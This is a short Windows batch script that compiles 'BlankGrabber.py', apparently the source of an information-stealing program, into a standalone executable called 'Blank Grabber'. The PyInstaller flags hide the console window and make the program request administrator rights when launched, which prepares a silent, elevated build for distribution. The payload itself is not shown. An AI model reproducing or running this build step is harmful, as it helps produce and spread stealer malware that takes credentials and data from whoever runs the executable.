@echo off
title Converting to exe...
pyinstaller --clean --onefile BlankGrabber.py --noconsole --uac-admin --noconfirm --name "Blank Grabber"
cls
echo Done! Press any key to exit.
pause >> NUL